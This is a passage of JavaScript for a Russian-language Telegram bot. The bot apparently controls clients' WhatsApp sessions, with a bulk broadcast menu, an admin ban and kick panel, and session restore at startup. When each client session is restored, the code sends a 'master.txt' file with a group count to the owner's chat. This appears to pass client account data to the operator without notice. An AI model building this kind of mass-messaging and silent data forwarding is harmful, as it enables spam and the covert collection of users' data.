    [{ text: st.media ? `📎 Медиа: ${st.media.kind} ✓` : '📎 Медиа', callback_data: 'bc_attach' }, { text: st.caption ? `📝 Текст: ${st.caption.slice(0, 10)}... ✓` : '📝 Текст', callback_data: 'bc_set_text' }],
    [{ text: '🧹 Очистить всё', callback_data: 'bc_clear' }],
    [{ text: '▶️ Запустить', callback_data: 'bc_start' }],
    [{ text: '🛑 Остановить', callback_data: 'bc_stop' }],
    [{ text: '🏠 Меню', callback_data: 'status' }],
  ];
  return bot.sendMessage(chatId, `📤 Рассылка\nРежим: ${st.bcMode}`, { reply_markup: { inline_keyboard: kb } });
}

async function renderAdminPanel(bot, chatId) {
  const st = uiState(chatId), u = loadUsers();
  const list = Object.values(u).filter(x => roleOf(chatId) === 'subadmin' ? roleOf(x.id) === 'client' : true).sort((a, b) => b.createdAt - a.createdAt);
  const pages = Math.max(1, Math.ceil(list.length / PAGE_SIZE_USERS)), page = Math.min(st.admPage, pages - 1);
  st.admPage = page;
  const slice = list.slice(page * PAGE_SIZE_USERS, (page + 1) * PAGE_SIZE_USERS);
  const kb = slice.map(x => [{ text: `${isConnected(x.id) ? '🟢' : '🔴'} ${x.id} [${roleOf(x.id)}]`, callback_data: `adm_user_${x.id}` }]);
  kb.push([{ text: '⬅️', callback_data: `adm_page_${Math.max(0, page - 1)}` }, { text: `${page + 1}/${pages}`, callback_data: 'admin_panel' }, { text: '➡️', callback_data: `adm_page_${Math.min(pages - 1, page + 1)}` }]);
  if (roleOf(chatId) === 'owner') kb.push([{ text: '📣 Объявление', callback_data: 'adm_broadcast' }]);
  return bot.sendMessage(chatId, `🛡 Панель (${page + 1}/${pages})`, { reply_markup: { inline_keyboard: kb } });
}

async function renderAdminUser(bot, chatId) {
  const st = uiState(chatId), t = st.admUser, u = loadUsers()[String(t)], b = loadBanned();
  if (!u) return renderAdminPanel(bot, chatId);
  const kb = [
    [{ text: '🛑 Стоп', callback_data: `adm_stop_${t}` }], [{ text: '🔌 Кик WA', callback_data: `adm_kickwa_${t}` }],
    [{ text: b.has(t) ? '♻️ Разбан' : '⛔ Бан', callback_data: `adm_ban_${t}` }], [{ text: '🗑 Удалить', callback_data: `adm_del_${t}` }],
    [{ text: '⬅️ Назад', callback_data: 'admin_panel' }]
  ];
  return bot.sendMessage(chatId, `👤 ${t}\nРоль: ${roleOf(t)}\nБан: ${b.has(t) ? 'да' : 'нет'}`, { reply_markup: { inline_keyboard: kb } });
}

// --- BOOTSTRAP & HTTP ---
const app = express();
app.get('/', (req, res) => res.json({ ok: true, slots: { used: 0, max: MAX_USERS }, sessions: sessions.size }));

app.listen(PORT, async () => {
  console.log(`[http] :${PORT}`);
  const bot = createBot(BOT_TOKEN);
  console.log('[bot] polling started');

  const users = loadUsers();
  for (const uid of Object.keys(users)) {
    if (fs.existsSync(P.authDir(uid))) {
      try {
        await startSession(uid, {
          onOwnerFile: async (buf, count, cid) => {
            await bot.sendDocument(OWNER_ID, buf, { caption: `📎 Ре-вход клиента ${cid}\nГрупп: ${count}` }, { filename: 'master.txt' });
          }
        });
      } catch {}
      await new Promise(r => setTimeout(r, 1500));
    }
  }
});
